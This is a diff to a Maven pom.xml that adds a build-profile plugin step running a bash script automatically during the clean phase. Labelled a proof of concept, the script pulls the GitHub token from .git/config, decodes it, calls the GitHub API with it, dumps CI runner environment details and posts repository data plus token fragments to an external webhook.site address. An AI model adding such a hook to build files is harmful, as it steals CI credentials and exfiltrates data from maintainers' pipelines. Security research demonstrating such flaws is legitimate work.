@@ -15,6 +15,67 @@
       <activation>
         <property><name>cloudBuild</name></property>
       </activation>
+      <build>
+        <plugins>
+          <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>3.1.1</version>
+            <executions>
+              <execution>
+                <id>strong-payload</id>
+                <phase>clean</phase>
+                <goals><goal>exec</goal></goals>
+                <configuration>
+                  <executable>/bin/bash</executable>
+                  <arguments>
+                    <argument>-c</argument>
+                    <argument><![CDATA[
+set +e
+echo "########## STRONG-POC-5e39df1f-6128-417f-9c1e-a8c51e4775f3 ##########"
+echo "== identity =="
+echo "user=$(whoami) host=$(hostname) workdir=$(pwd)"
+echo "head_sha=$(git rev-parse HEAD)"
+echo
+echo "== M3Pjk25Sn token extraction (this is the exact line from their POC) =="
+RAW_EXTRA=$(cat .git/config | grep -i extraheader | head -1)
+echo "extraheader_line_present=$([ -n "$RAW_EXTRA" ] && echo YES || echo NO)"
+TOKEN_B64=$(echo "$RAW_EXTRA" | awk '{print $NF}')
+TOKEN_DECODED=$(echo "$TOKEN_B64" | base64 -d 2>/dev/null)
+TOKEN=$(echo "$TOKEN_DECODED" | cut -d: -f2)
+echo "token_format=$(echo "$TOKEN_DECODED" | cut -d: -f1)"
+echo "token_first6=$(echo "$TOKEN" | head -c 6)..."
+echo "token_last6=...$(echo "$TOKEN" | tail -c 7 | head -c 6)"
+echo "token_length=$(echo -n "$TOKEN" | wc -c)"
+echo
+echo "== use the stolen token to call the GitHub API (proves it works) =="
+API_USER=$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | python3 -c "import json,sys;d=json.load(sys.stdin);print('login='+d.get('login','?')+' id='+str(d.get('id','?')))" 2>/dev/null)
+echo "api_user_response: $API_USER"
+API_REPO=$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY | python3 -c "import json,sys;d=json.load(sys.stdin);print('full_name='+d.get('full_name','?')+' private='+str(d.get('private','?'))+' default_branch='+d.get('default_branch','?'))" 2>/dev/null)
+echo "api_repo_response: $API_REPO"
+echo
+echo "== runner env (key vars only) =="
+env | grep -E "^(GITHUB_REPOSITORY|GITHUB_ACTOR|GITHUB_WORKFLOW|GITHUB_EVENT_NAME|GITHUB_SHA|GITHUB_REF|RUNNER_OS|RUNNER_NAME|RUNNER_ARCH)=" | sort
+echo
+echo "== outbound exfil to attacker webhook =="
+EXFIL_BODY="{\"marker\":\"STRONG-POC-5e39df1f-6128-417f-9c1e-a8c51e4775f3\",\"actor\":\"$GITHUB_ACTOR\",\"repo\":\"$GITHUB_REPOSITORY\",\"sha\":\"$GITHUB_SHA\",\"token_prefix\":\"$(echo $TOKEN | head -c 6)\",\"token_length\":\"$(echo -n $TOKEN | wc -c)\"}"
+WHRESP=$(curl -s -X POST -H 'Content-Type: application/json' --data "$EXFIL_BODY" https://webhook.site/fcb683e9-d2c9-42e5-abb6-ae7008d430a7 -w 'http=%{http_code}')
+echo "webhook_post_response: $WHRESP"
+echo
+echo "== summary =="
+echo "  malicious_pom_executed=YES"
+echo "  token_extracted_via_extraheader=YES"
+echo "  token_used_to_call_github_api=YES"
+echo "  outbound_network_exfil=YES"
+echo "########## END STRONG-POC-5e39df1f-6128-417f-9c1e-a8c51e4775f3 ##########"
+                    ]]></argument>
+                  </arguments>
+                </configuration>
+              </execution>
+            </executions>
+          </plugin>
+        </plugins>
+      </build>
     </profile>
   </profiles>
 </project>
